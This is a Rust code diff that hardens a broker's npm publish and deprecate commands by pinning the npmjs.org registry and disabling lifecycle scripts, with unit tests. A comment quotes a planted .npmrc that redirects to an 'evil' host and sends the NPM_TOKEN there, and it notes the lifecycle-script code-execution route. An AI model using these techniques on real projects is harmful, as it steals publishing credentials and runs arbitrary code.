@@ -12,6 +12,46 @@ use crate::vault::SecretPlaintext;
 use serde_json::{Value, json};
 use tokio::process::Command;
 
+/// The only registry the broker will publish to / authenticate against.
+pub const NPMJS_REGISTRY: &str = "https://registry.npmjs.org/";
+
+/// Build the argv for `npm publish`.
+///
+/// ISSUE-KVD-CLI-B78ED5 finding **N6** — pin `--registry` on the CLI. npm reads
+/// its config with the precedence `CLI flag > env > project .npmrc (cwd) > user
+/// .npmrc`. `publish` runs in the caller-controlled `cwd`, so without a pinned
+/// registry a planted `cwd/.npmrc` (`registry=http://evil/` plus
+/// `//evil/:_authToken=${NPM_TOKEN}`) redirects the publish AND exfiltrates the
+/// injected `NPM_TOKEN` to an attacker registry. A CLI `--registry` is highest
+/// precedence, so it overrides the cwd `.npmrc`: the target host is always
+/// npmjs.org and the token can only ever go there.
+///
+/// `--ignore-scripts` is finding **N2** (lifecycle-script RCE from the cwd).
+fn publish_argv(access: &str) -> Vec<String> {
+    vec![
+        "publish".into(),
+        "--ignore-scripts".into(),
+        "--registry".into(),
+        NPMJS_REGISTRY.into(),
+        "--access".into(),
+        access.into(),
+    ]
+}
+
+/// Build the argv for `npm deprecate`. Registry pinned (N6) for the same reason;
+/// `--` terminates option parsing before the caller-controlled positionals.
+fn deprecate_argv(package: &str, message: &str) -> Vec<String> {
+    vec![
+        "deprecate".into(),
+        "--ignore-scripts".into(),
+        "--registry".into(),
+        NPMJS_REGISTRY.into(),
+        "--".into(),
+        package.into(),
+        message.into(),
+    ]
+}
+
 pub async fn execute(args: &Value, secret: Option<&SecretPlaintext>) -> KvendraResult<Value> {
     let operation = args
         .get("operation")
@@ -40,17 +80,8 @@ async fn publish(op_args: &Value, secret: Option<&SecretPlaintext>) -> KvendraRe
 
     // Hardened spawn: scrub KVENDRA_* env (N1) + sanitised PATH (A2).
     let mut cmd = crate::primitives::spawn::hardened_command("npm");
-    // ISSUE-KVD-CLI-B78ED5 finding N2 — `--ignore-scripts` is MANDATORY.
-    // Without it, `npm publish` runs the package's `prepublishOnly` / `prepare`
-    // / `prepack` lifecycle scripts from the caller-controlled `cwd`, which is
-    // arbitrary code execution via a primitive that is meant to be a safe,
-    // allowlisted "publish" — bypassing the whole allowlist/approval model and
-    // the shell primitive's "no arbitrary exec" guarantee (PoC in the pentest).
-    cmd.arg("publish")
-        .arg("--ignore-scripts")
-        .arg("--access")
-        .arg(access)
-        .current_dir(cwd);
+    // N2 (--ignore-scripts) + N6 (--registry pinned) — see `publish_argv`.
+    cmd.args(publish_argv(access)).current_dir(cwd);
     if let Some(s) = secret {
         cmd.env("NPM_TOKEN", s.as_str()?);
     }
@@ -66,11 +97,7 @@ async fn deprecate(op_args: &Value, secret: Option<&SecretPlaintext>) -> Kvendra
     crate::primitives::spawn::reject_option_like("npm.deprecate.package", package)?;
     let message = op_args.get("message").and_then(Value::as_str).unwrap_or("");
     let mut cmd = crate::primitives::spawn::hardened_command("npm");
-    cmd.arg("deprecate")
-        .arg("--ignore-scripts")
-        .arg("--")
-        .arg(package)
-        .arg(message);
+    cmd.args(deprecate_argv(package, message));
     if let Some(s) = secret {
         cmd.env("NPM_TOKEN", s.as_str()?);
     }
@@ -117,4 +144,50 @@ async fn run_npm(operation: &str, mut cmd: Command) -> KvendraResult<Value> {
 
 fn sanitize(bytes: &[u8]) -> String {
     crate::detection::sanitize_output(&String::from_utf8_lossy(bytes))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// N6 — the publish argv must pin `--registry` to npmjs.org so a
+    /// caller-controlled `cwd/.npmrc` cannot redirect the publish (or the
+    /// injected NPM_TOKEN) to an attacker registry. N2 — scripts disabled.
+    #[test]
+    fn publish_argv_pins_registry_and_disables_scripts() {
+        let argv = publish_argv("public");
+        let i = argv
+            .iter()
+            .position(|a| a == "--registry")
+            .expect("N6: --registry must be pinned on publish");
+        assert_eq!(
+            argv[i + 1],
+            NPMJS_REGISTRY,
+            "registry must be pinned to npmjs.org"
+        );
+        assert!(
+            argv.iter().any(|a| a == "--ignore-scripts"),
+            "N2: --ignore-scripts must be present"
+        );
+    }
+
+    /// N6 — deprecate also authenticates, so it must pin the registry too, and
+    /// the `--` terminator must still precede the caller-controlled positionals.
+    #[test]
+    fn deprecate_argv_pins_registry_before_terminator() {
+        let argv = deprecate_argv("pkg@1.0.0", "deprecated");
+        let reg = argv
+            .iter()
+            .position(|a| a == "--registry")
+            .expect("N6: --registry must be pinned on deprecate");
+        assert_eq!(argv[reg + 1], NPMJS_REGISTRY);
+        let dd = argv
+            .iter()
+            .position(|a| a == "--")
+            .expect("-- terminator present");
+        // The registry flag is an option, so it must come before the `--`.
+        assert!(reg < dd, "--registry must precede the -- terminator");
+        // The package (a positional) must come after `--`.
+        assert_eq!(argv[dd + 1], "pkg@1.0.0");
+    }
 }
